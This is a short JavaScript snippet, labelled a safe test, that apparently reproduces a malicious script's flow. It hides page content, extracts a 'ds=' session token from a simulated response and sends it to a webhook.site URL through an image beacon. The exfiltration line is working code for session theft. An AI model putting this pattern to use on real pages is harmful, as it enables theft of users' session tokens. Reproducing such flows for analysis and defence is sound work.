// SAFE TEST: simulates the malicious flow but only uses a local/data response
const WEBHOOK = 'https://webhook.site/15e1ab86-ae46-443a-bca0-726d4b5e9669';
document.body.innerHTML += '<div class="main">MAIN CONTENT</div>';
document.getElementsByClassName("main")[0].style.display = "none";

// simulate getting a response that contains "ds=" token
fetch('data:text/plain,Hello%20world%20ds=TESTSESSION_0123456789ABCDEF')
  .then(r => r.text())
  .then(response => {
    // extract token like the malicious script would
    const m = response.match(/ds=(.*)/);
    const session = m ? m[1] : 'NOT_FOUND';
    // exfiltrate to your webhook (you own this URL)
    new Image().src = WEBHOOK + '?c=' + encodeURIComponent(session);
    // restore visible content
    document.getElementsByClassName("main")[0].style.display = "";
  });
